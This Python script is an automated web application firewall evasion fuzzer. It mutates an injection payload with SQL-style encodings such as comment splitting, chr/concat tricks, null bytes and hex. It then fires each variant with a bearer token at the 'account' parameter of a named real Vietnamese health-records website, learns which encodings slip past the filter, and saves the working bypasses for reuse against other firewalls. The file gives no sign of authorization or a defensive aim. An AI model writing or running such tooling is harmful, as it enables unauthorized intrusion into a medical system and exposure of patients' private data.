import argparse
import json
import random
import re
import sys
import time
from collections import deque
from pathlib import Path
from typing import Optional
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from adversarial import mutate_from_blocked
from evasion.curl_bypass_f5 import (
    BASE_URL,
    BEARER,
    COOKIE,
    RAW_PAYLOAD,
    variants_f5,
)
from evasion.bandit_schedule import sort_variants
from evasion.payload_fingerprint import payload_fingerprint
from evasion.transformers import all_transforms

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

DATA_DIR = Path(__file__).resolve().parent.parent / "data"
OUT_FILE = DATA_DIR / "bypass_found.txt"
BYPASS_JSONL = DATA_DIR / "bypass_learned.jsonl"
BLOCKED_JSONL = DATA_DIR / "blocked_learned.jsonl"
LEARNED_ENCODINGS_FILE = DATA_DIR / "learned_encodings.json"
TRANSFORM_POLICY_FILE = DATA_DIR / "transform_policy.json"
EXPERIMENT_RUNS_FILE = DATA_DIR / "experiment_runs.jsonl"
MAX_GEN = 5

TRANSFORM_KEYS = (
    "tab", "newline", "vtab", "cr", "ff", "comment_block", "plus_space",
    "case_mix", "split_comment", "double_encoded_quote", "chr_oracle",
    "case_random", "concat_oracle", "url_encode", "encoded", "identity",
    "comment_inline", "null_byte", "hex",
)

TOKEN_MATCH_ORDER = (
    "tab", "newline", "vtab", "cr", "ff", "plus_space", "split_comment",
    "double_encoded_quote", "chr_oracle", "case_random", "concat_oracle",
    "comment_block", "comment_inline", "null_byte", "hex",
    "url_encode", "encoded", "case_mix", "identity",
)

HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Authorization": f"Bearer {BEARER}",
    "Origin": "https://ybadientu.hososuckhoe.vn",
    "Referer": "https://ybadientu.hososuckhoe.vn/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
}
if COOKIE:
    HEADERS["Cookie"] = COOKIE


def build_url(payload: str) -> str:
    q = quote(payload, safe="") if not payload.startswith("36331%") else payload
    return f"{BASE_URL}?account={q}"


def is_bypass(resp) -> bool:
    if resp.status_code != 200:
        return False
    text = (resp.text or "").lower()
    reject_phrases = [
        "request rejected", "access forbidden", "request blocked",
        "request has been blocked", "blocked by", "access denied",
    ]
    for p in reject_phrases:
        if p in text:
            return False
    if '"blocked":true' in text or '"rejected":true' in text:
        return False
    return True


def load_transform_policy() -> dict:
    if not TRANSFORM_POLICY_FILE.exists():
        return {
            "enabled": False,
            "exclude": [],
            "explore_rate": 0.08,
            "never_exclude": ["other"],
            "explore_mode": "fixed",
        }
    try:
        with open(TRANSFORM_POLICY_FILE, "r", encoding="utf-8") as f:
            p = json.load(f)
        p.setdefault("enabled", True)
        p.setdefault("exclude", [])
        p.setdefault("explore_rate", 0.08)
        p.setdefault("never_exclude", ["other"])
        p.setdefault("explore_mode", "fixed")
        return p
    except (json.JSONDecodeError, OSError):
        return {
            "enabled": False,
            "exclude": [],
            "explore_rate": 0.08,
            "never_exclude": ["other"],
            "explore_mode": "fixed",
        }


def policy_keeps_variant(name: str, policy: dict) -> bool:
    if not policy.get("enabled", True):
        return True
    key = name_to_transform_key(name)
    ne = set(policy.get("never_exclude") or [])
    if key in ne:
        return True
    if key not in policy.get("exclude", []):
        return True
    trans = load_learned_encodings().get("transforms", {})
    t = trans.get(key, {"bypass": 0, "block": 0})
    b, bl = int(t.get("bypass", 0)), int(t.get("block", 0))
    if policy.get("explore_mode") == "thompson":
        p = random.betavariate(1 + b, 1 + bl)
        return random.random() < p
    return random.random() < float(policy.get("explore_rate", 0.08))


def filter_variant_list(variants: list[tuple[str, str]], policy: dict) -> list[tuple[str, str]]:
    if not policy.get("enabled", True):
        return list(variants)
    return [(pl, n) for pl, n in variants if policy_keeps_variant(n, policy)]


def spawn_from(payload: str, prefix: str = "gen", policy: Optional[dict] = None) -> list[tuple[str, str]]:
    policy = policy or load_transform_policy()
    out = []
    for transformed, tname in all_transforms(payload):
        if transformed and len(transformed) < 2000:
            out.append((transformed, f"{prefix}_{tname}"))
    return filter_variant_list(out, policy)


def next_gen_from_base(base: str, gen: int, policy: dict, schedule_mode: str) -> list[tuple[str, str]]:
    if gen == 0:
        v = variants_f5(base)
        return filter_variant_list(v, policy)
    prev = next_gen_from_base(base, gen - 1, policy, schedule_mode)
    out = []
    for pl, name in prev:
        for t, tname in all_transforms(pl):
            if t and len(t) < 2000:
                out.append((t, f"g{gen}_{name}_{tname}"))
    out = filter_variant_list(out, policy)
    trans = load_learned_encodings().get("transforms", {})
    out = sort_variants(out, schedule_mode, trans, name_to_transform_key)
    return out[:300]


def name_to_transform_key(name: str) -> str:
    n = name.lower()
    tokens = {t for t in re.split(r"[_\W]+", n) if t}
    for k in TOKEN_MATCH_ORDER:
        if k in tokens:
            return k
    for k in sorted(TRANSFORM_KEYS, key=len, reverse=True):
        if len(k) >= 5 and k in n:
            return k
    if "comment" in n:
        return "comment_block"
    if "encode" in n:
        return "encoded"
    return "other"


def load_learned_encodings() -> dict:
    if not LEARNED_ENCODINGS_FILE.exists():
        return {}
    try:
        with open(LEARNED_ENCODINGS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except (json.JSONDecodeError, IOError):
        return {}


def save_learned_encodings(data: dict):
    with open(LEARNED_ENCODINGS_FILE, "w", encoding="utf-8") as f:
        json.dump({**data, "updated_ts": time.time()}, f, ensure_ascii=False, indent=0)


def update_learned_encoding(transform_key: str, bypass: bool):
    data = load_learned_encodings()
    if "transforms" not in data:
        data["transforms"] = {}
    t = data["transforms"].setdefault(transform_key, {"bypass": 0, "block": 0})
    if bypass:
        t["bypass"] = t.get("bypass", 0) + 1
    else:
        t["block"] = t.get("block", 0) + 1
    save_learned_encodings(data)


def sort_queue_variants(variants: list[tuple[str, str]], schedule_mode: str) -> list[tuple[str, str]]:
    trans = load_learned_encodings().get("transforms", {})
    return sort_variants(variants, schedule_mode, trans, name_to_transform_key)


def load_saved_bypasses() -> list[tuple[str, str]]:
    out = []
    if BYPASS_JSONL.exists():
        with open(BYPASS_JSONL, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                try:
                    o = json.loads(line)
                    out.append((o["payload"], o.get("name", "saved")))
                except (json.JSONDecodeError, KeyError):
                    pass
    if not out and OUT_FILE.exists():
        with open(OUT_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if "\t" in line:
                    name, payload = line.split("\t", 1)
                    out.append((payload, name))
    return out


def save_bypass(payload: str, name: str, gen: int):
    with open(OUT_FILE, "a", encoding="utf-8") as f:
        f.write(f"{name}\t{payload}\n")
    with open(BYPASS_JSONL, "a", encoding="utf-8") as f:
        f.write(json.dumps({"payload": payload, "name": name, "gen": gen, "ts": time.time()}, ensure_ascii=False) + "\n")


def save_blocked(payload: str, name: str, status_code: int):
    with open(BLOCKED_JSONL, "a", encoding="utf-8") as f:
        f.write(json.dumps({"payload": payload, "name": name, "status": "blocked", "status_code": status_code, "ts": time.time()}, ensure_ascii=False) + "\n")


def reset_run_data_files():
    for p in (OUT_FILE, BYPASS_JSONL, BLOCKED_JSONL):
        p.write_text("", encoding="utf-8")
    with open(LEARNED_ENCODINGS_FILE, "w", encoding="utf-8") as f:
        json.dump({"transforms": {}, "updated_ts": time.time()}, f, ensure_ascii=False, indent=0)


def run(
    max_tests: Optional[int] = None,
    schedule_mode: str = "rate",
    dedup_fingerprint: bool = False,
    adv_from_block: bool = False,
    adv_max_per_block: int = 8,
    adv_total_cap: int = 5000,
):
    seen = set()
    seen_fp: set[str] = set()
    bypasses = []
    policy = load_transform_policy()
    if policy.get("enabled") and policy.get("exclude"):
        print(
            f"Transform policy: exclude {len(policy['exclude'])} dead keys "
            f"(explore_rate={policy.get('explore_rate', 0.08)}) -> {TRANSFORM_POLICY_FILE}"
        )
    initial = variants_f5(RAW_PAYLOAD)
    initial = filter_variant_list(initial, policy)
    initial = sort_queue_variants(initial, schedule_mode)
    queue = deque(initial)
    enc = load_learned_encodings()
    if enc.get("transforms"):
        print(f"Loaded learned encodings: {LEARNED_ENCODINGS_FILE} (try high-score first)")
    saved = load_saved_bypasses()
    if saved:
        print(f"Loaded {len(saved)} saved bypass(es), spawning variants to queue...")
        for payload, name in saved:
            for t, tname in spawn_from(payload, "saved", policy):
                queue.append((t, tname))
    gen = 0
    total_tested = 0
    adv_enqueued_total = 0
    while True:
        if not queue:
            gen += 1
            if gen > MAX_GEN:
                print("Max generations reached. Stop.")
                break
            print(f"\n[Gen {gen}] Refill from base (depth {gen})...")
            refill = next_gen_from_base(RAW_PAYLOAD, gen, policy, schedule_mode)
            queue.extend(refill)
            print(f"  Queue size: {len(queue)}")
            if not queue:
                print("No more variants. Stop.")
                break
        if max_tests is not None and total_tested >= max_tests:
            print(f"\nStopped: max_tests={max_tests} (HTTP attempts).")
            break
        payload, name = queue.popleft()
        key = (payload[:300], name)
        if key in seen:
            continue
        if dedup_fingerprint:
            fp = payload_fingerprint(payload)
            if fp in seen_fp:
                continue
            seen_fp.add(fp)
        seen.add(key)
        total_tested += 1
        url = build_url(payload)
        try:
            r = requests.get(url, headers=HEADERS, timeout=12)
        except requests.RequestException as e:
            print(f"  [{total_tested}] {name}: error {e}")
            continue
        if r.status_code == 401:
            print(
                "\nStopped: HTTP 401 Unauthorized (token expired or invalid). "
                "Update BEARER in evasion/curl_bypass_f5.py and rerun."
            )
            break
        if is_bypass(r):
            bypasses.append((payload, name))
            print(f"\n  *** BYPASS #{len(bypasses)} [{name}] ***")
            print(f"  payload (first 120): {payload[:120]}...")
            save_bypass(payload, name, gen)
            update_learned_encoding(name_to_transform_key(name), bypass=True)
            for t, tname in spawn_from(payload, f"b{len(bypasses)}", policy):
                queue.append((t, tname))
        else:
            save_blocked(payload, name, r.status_code)
            update_learned_encoding(name_to_transform_key(name), bypass=False)
            print(f"  [{total_tested}] {name}: {r.status_code} blocked")
            if adv_from_block and adv_enqueued_total < adv_total_cap:
                adv = mutate_from_blocked(payload)
                adv = filter_variant_list(list(adv), policy)
                adv = sort_queue_variants(adv, schedule_mode)
                added = 0
                for p, tname in adv:
                    if added >= adv_max_per_block:
                        break
                    if adv_enqueued_total >= adv_total_cap:
                        break
                    queue.append((p, f"{tname}_blk<{name[:80]}"))
                    added += 1
                    adv_enqueued_total += 1
    print(f"\nDone. Tested {total_tested}, bypasses: {len(bypasses)}")
    print(f"Learned encodings (reuse for Cloudflare/other WAF): {LEARNED_ENCODINGS_FILE}")
    if bypasses:
        print(f"Bypass list: {OUT_FILE}")
    return bypasses, total_tested


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument(
        "--fresh",
        action="store_true",
        help="Clear bypass_found, bypass_learned, blocked_learned, learned_encodings before run (default: append to existing)",
    )
    ap.add_argument(
        "--max-tests",
        type=int,
        default=None,
        metavar="N",
        help="Stop after N HTTP GET attempts (excluding skipped duplicates). Default: run until queue exhausts or gen > %d." % MAX_GEN,
    )
    ap.add_argument(
        "--sort",
        choices=("rate", "thompson", "ucb"),
        default="rate",
        help="Queue ordering: empirical rate (default), Thompson sampling, or UCB.",
    )
    ap.add_argument(
        "--dedup-fingerprint",
        action="store_true",
        help="Skip payloads with same normalized fingerprint (reduces near-duplicate HTTP).",
    )
    ap.add_argument(
        "--adv-from-block",
        action="store_true",
        help="Enqueue adversarial variants from blocked payloads (see adversarial/).",
    )
    ap.add_argument(
        "--adv-max-per-block",
        type=int,
        default=8,
        metavar="N",
        help="Max adversarial variants enqueued per blocked response (default: 8).",
    )
    ap.add_argument(
        "--adv-total-cap",
        type=int,
        default=5000,
        metavar="N",
        help="Stop enqueueing adversarial variants after this many total (default: 5000).",
    )
    ns = ap.parse_args()
    if ns.fresh:
        reset_run_data_files()
        print(f"Cleared: {OUT_FILE.name}, {BYPASS_JSONL.name}, {BLOCKED_JSONL.name}, {LEARNED_ENCODINGS_FILE.name}")
    bypasses, total_tested = run(
        max_tests=ns.max_tests,
        schedule_mode=ns.sort,
        dedup_fingerprint=ns.dedup_fingerprint,
        adv_from_block=ns.adv_from_block,
        adv_max_per_block=ns.adv_max_per_block,
        adv_total_cap=ns.adv_total_cap,
    )
    log = {
        "ts": time.time(),
        "fresh": ns.fresh,
        "max_tests": ns.max_tests,
        "sort": ns.sort,
        "dedup_fingerprint": ns.dedup_fingerprint,
        "adv_from_block": ns.adv_from_block,
        "adv_max_per_block": ns.adv_max_per_block,
        "adv_total_cap": ns.adv_total_cap,
        "http_attempts": total_tested,
        "bypass_count": len(bypasses),
        "data_dir": str(DATA_DIR.resolve()),
    }
    with open(EXPERIMENT_RUNS_FILE, "a", encoding="utf-8") as f:
        f.write(json.dumps(log, ensure_ascii=False) + "\n")
    print(f"Appended run summary -> {EXPERIMENT_RUNS_FILE}")
